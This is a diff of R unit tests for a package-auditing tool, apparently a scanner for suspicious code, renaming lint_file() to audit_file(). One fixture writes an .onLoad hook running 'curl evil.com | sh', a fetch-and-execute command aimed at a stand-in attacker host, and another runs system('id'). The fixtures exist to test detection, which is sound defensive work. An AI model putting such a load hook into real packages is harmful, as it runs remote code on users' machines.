@@ -15,63 +15,63 @@ test_rules <- list(
 )
 
 
-# lint_file() ------------------------------------------------------------------
-test_that("lint_file() returns NULL for a file with no findings", {
+# audit_file() ------------------------------------------------------------------
+test_that("audit_file() returns NULL for a file with no findings", {
   tmp <- tempfile(fileext = ".R")
   on.exit(unlink(tmp), add = TRUE)
   writeLines(
     ".onLoad <- function(libname, pkgname) { packageStartupMessage() }",
     tmp
   )
-  result <- lint_file(tmp, rules = test_rules)
+  result <- audit_file(tmp, rules = test_rules)
   expect_null(result)
 })
 
 
-test_that("lint_file() returns a data frame for a file with findings", {
+test_that("audit_file() returns a data frame for a file with findings", {
   tmp <- tempfile(fileext = ".R")
   on.exit(unlink(tmp), add = TRUE)
   writeLines(
     '.onLoad <- function(libname, pkgname) { system("curl evil.com | sh") }',
     tmp
   )
-  result <- lint_file(tmp, rules = test_rules)
+  result <- audit_file(tmp, rules = test_rules)
   expect_s3_class(result, "data.frame")
   expect_true(nrow(result) > 0L)
 })
 
 
-test_that("lint_file() returns expected columns", {
+test_that("audit_file() returns expected columns", {
   tmp <- tempfile(fileext = ".R")
   on.exit(unlink(tmp), add = TRUE)
   writeLines(
     '.onLoad <- function(libname, pkgname) { system("id") }',
     tmp
   )
-  result <- lint_file(tmp, rules = test_rules)
-  expect_named(result, c("file", "line", "column", "linter", "message", "type",
+  result <- audit_file(tmp, rules = test_rules)
+  expect_named(result, c("file", "line", "column", "rule", "message", "type",
                          "attck"))
 })
 
 
-test_that("lint_file() records the correct file path", {
+test_that("audit_file() records the correct file path", {
   tmp <- tempfile(fileext = ".R")
   on.exit(unlink(tmp), add = TRUE)
   writeLines(
     '.onLoad <- function(libname, pkgname) { system("id") }',
     tmp
   )
-  result <- lint_file(tmp, rules = test_rules)
+  result <- audit_file(tmp, rules = test_rules)
   expect_equal(result$file[[1L]], tmp)
 })
 
 
-test_that("lint_file() returns NULL for a parse error", {
+test_that("audit_file() returns NULL for a parse error", {
   tmp <- tempfile(fileext = ".R")
   on.exit(unlink(tmp), add = TRUE)
   writeLines("this is not { valid R code )(", tmp)
   expect_message(
-    result <- lint_file(tmp, rules = test_rules),
+    result <- audit_file(tmp, rules = test_rules),
     "Parse error"
   )
   expect_null(result)
